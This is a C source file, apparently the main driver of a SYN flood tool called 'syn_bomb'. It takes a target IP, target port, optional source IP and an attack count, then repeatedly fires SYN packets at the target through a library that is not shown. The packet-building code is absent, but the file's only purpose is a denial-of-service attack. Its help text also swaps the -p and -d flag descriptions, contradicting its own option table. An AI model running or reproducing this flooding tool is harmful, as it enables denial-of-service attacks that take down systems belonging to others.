#include "syn_bomb.h"

static int dip_set = 0;
static int dport_set = 0;
static int time_set = 0;

//* ------ Global Variables -------- */
static struct option options[] = {
	{"sip",		required_argument,	NULL,	's' },
	{"dip",		required_argument,	NULL,	'd' },
	{"dport",	required_argument,	NULL,	'p' },
	{"time",	required_argument,	NULL,	't' },
	{"help",	no_argument,		NULL,	'h' },
	{ NULL, 0, NULL, 0 }
};

/**
 * [main description]
 * @param  argc [description]
 * @param  argv [description]
 * @return      [description]
 */
int main(int argc, char *argv[])
{
	int i = 0, n = 0, dport = 0, attack_times;
	char *dip = NULL,
		 *sip = NULL;
	struct syn_bomb bomb;

	if ( argc < 2)
		goto error_usage;

	while ( n >= 0)
	{
		n = getopt_long(argc, argv, "p:s:d:t:h", options, NULL);
		if ( n < 0)
			continue;

		switch(n)
		{
			case 'p':

				if (optarg) {
					dport = atoi(optarg);
					dport_set = 1;
				}

				break;

			case 'd':
				if (optarg)	{
					dip = optarg;
					dip_set = 1;
				}	

				break;

			case 's':
				if (optarg)
					sip = optarg;
				break;

			case 't':
				if (optarg) {
					attack_times = atoi(optarg);
					time_set = 1;
				}

				break;
			case 'h':
				goto error_usage;

			case '?':
				fprintf(stderr, "Error arguments input.\n" );
				goto error_usage;
		}

	}

	if ( !dip_set) {
		fprintf(stderr, "dip doesn't set.\n");
		goto error_usage;		
	}
	if ( !dport_set) {
		fprintf(stderr, "dport doesn't set.\n");
		goto error_usage;		
	}

	if ( !time_set) {
		fprintf(stderr, "attack time doesn't set.\n");
		goto error_usage;		
	}


	libsynbomb_init(&bomb, sip, dip, dport);

	printf(KBLU_L"local ip:%s, target ip:%s & port: %d"RESET"\n", bomb.local_ip, bomb.target_ip, bomb.target_port);

	while ( i < attack_times) {
		bomb.service(&bomb);
		i++;
		// printf(KGRN_L"syn bomb has do %d times"RESET"\n", i);
		usleep(10);
	}

	printf(KGRN_L"%d syn bombs have been sent."RESET"\n", i);

	libsynbomb_clean(&bomb);
	return 0;

error_usage:
	fprintf(stderr, "\nError usage:\n");
	fprintf(stderr, "\t-s, --sip <source ip>\t e.g. -s 192.168.1.100\n");
	fprintf(stderr, "\t-p, --dip <destination ip>\t e.g. -p 80,90,20~500\n");
	fprintf(stderr, "\t-d, --dport <destination port>\t e.g. -d 8.8.8.8\n");
	fprintf(stderr, "\t-t, --time <attack times>\t e.g. -t 100\n");
	return 1;
}